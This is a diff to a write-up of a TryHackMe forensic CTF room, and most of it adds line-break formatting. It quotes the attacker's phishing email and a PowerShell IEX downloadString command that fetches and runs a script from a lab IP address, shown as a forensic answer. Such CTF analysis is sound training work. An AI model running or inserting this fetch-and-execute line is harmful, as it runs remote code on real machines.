@@ -33,6 +33,7 @@ Access this hard-level CTF clicking <a href="https://tryhackme.com/room/eventhor
 
 <br>
 <br>
+<br>
 
 <p>1.2. What was the body of the email that was sent by the attacker?<br>
 <code>Tom! I have done it! I have found the mass of the black hole we found! Run this script as the AdministratOr! Your BEst friend DOm</code></p>
@@ -43,18 +44,21 @@ Access this hard-level CTF clicking <a href="https://tryhackme.com/room/eventhor
 
 <br>
 <br>
+<br>
 
 <p>1.3. What command initiated the malicious script download?<br>
-<code>IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')</code>
+<code>IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')</code></p>
 
 <br>
 
 <img width="1343" height="590" alt="image" src="https://github.com/user-attachments/assets/7316026d-9aed-4619-a090-156c1bdf96ce" />
 
 <br>
+<br>
 
 <img width="1358" height="571" alt="image" src="https://github.com/user-attachments/assets/5657b241-81bf-4605-93e5-dbf7d15c7c4d" />
 
+<br>
 <br>
 <br>
 
@@ -63,11 +67,12 @@ Access this hard-level CTF clicking <a href="https://tryhackme.com/room/eventhor
 
 <br>
 <br>
-
+<br>
 
 <p>1.5. What is the Administrator NTLM hash that the attacker found?<br>
 <code>__________</code></p>
 
+<br>
 <br>
 <br>
 
